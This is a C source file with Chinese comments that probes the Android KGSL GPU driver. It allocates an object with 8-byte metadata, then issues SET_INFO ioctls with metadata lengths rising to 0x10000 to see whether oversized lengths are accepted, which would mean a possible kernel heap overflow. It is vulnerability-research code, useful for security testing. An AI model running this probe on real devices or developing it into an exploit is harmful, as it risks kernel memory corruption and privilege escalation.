/* kgsl_meta.c — 测试 GPUOBJ metadata_len 是否在校验上不一致(分配小 / SET_INFO 大)
 * 保守递进: 8 -> 64 -> 256 -> 1024, 每步检查返回与后续存活
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#define CMD_ALLOC 0xc0300945u
#define CMD_INFO  0xc0300947u
#define CMD_SET   0xc020094cu
static int fd;
static unsigned alloc_obj(unsigned long long size, unsigned long long valen,
                          unsigned mlen, void *meta) {
    unsigned char b[64]; memset(b,0,sizeof(b));
    unsigned long long s=size, f=0, v=valen, mp=(unsigned long long)(uintptr_t)meta;
    memcpy(b+0,&s,8); memcpy(b+8,&f,8); memcpy(b+16,&v,8);
    memcpy(b+36,&mlen,4); memcpy(b+40,&mp,8);
    errno=0; int r=ioctl(fd,CMD_ALLOC,b);
    unsigned id; memcpy(&id,b+32,4);
    printf("  ALLOC size=0x%llx mlen=%u -> ret=%d errno=%d id=%u\n", size, mlen, r, errno, id);
    return r==0?id:0;
}
static int set_meta(unsigned id, unsigned mlen, void *meta) {
    unsigned char b[64]; memset(b,0,sizeof(b));
    unsigned long long t=id; memcpy(b+0,&t,8);
    unsigned int ty=1, ml=mlen; memcpy(b+16,&ty,4); memcpy(b+20,&ml,4);
    unsigned long long mp=(unsigned long long)(uintptr_t)meta; memcpy(b+24,&mp,8);
    errno=0; int r=ioctl(fd,CMD_SET,b);
    return r==0?0:errno;
}
int main(void){
    fd=open("/dev/kgsl-3d0",O_RDWR); if(fd<0){printf("open fail %d\n",errno);return 1;}
    /* 大用户缓冲(1MB)保证 copy_from_user 有合法来源 */
    unsigned char *big = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(big==MAP_FAILED){printf("mmap fail\n");return 1;}
    memset(big, 0x33, 0x100000);
    unsigned char meta8[8]; memset(meta8,0x44,8);

    printf("== 对照组: 分配 8B metadata ==\n");
    unsigned id = alloc_obj(0x1000, 0x1000, 8, meta8);
    if(!id) return 1;

    printf("\n== 递进测试 SET_INFO metadata_len(分配时只有 8) ==\n");
    unsigned lens[] = {8, 16, 64, 256, 1024, 4096, 0x10000};
    for(unsigned i=0;i<sizeof(lens)/sizeof(lens[0]);i++){
        int e = set_meta(id, lens[i], big);
        printf("  metadata_len=%6u -> ret=%s errno=%d\n", lens[i], e==0?"0":"-1", e);
        if (e == 0) printf("        ^^^ 接受: 大于分配长度(8)\n");
        fflush(stdout);
    }
    printf("\n== 存活检查: 再查 INFO ==\n");
    { unsigned char c[64]; memset(c,0,sizeof(c)); unsigned long long t=id; memcpy(c+40,&t,8);
      errno=0; int r=ioctl(fd,CMD_INFO,c);
      printf("  INFO ret=%d errno=%d gpuaddr=0x%llx\n", r, errno, *(unsigned long long*)c); }
    close(fd); printf("\ndone alive\n"); return 0; }
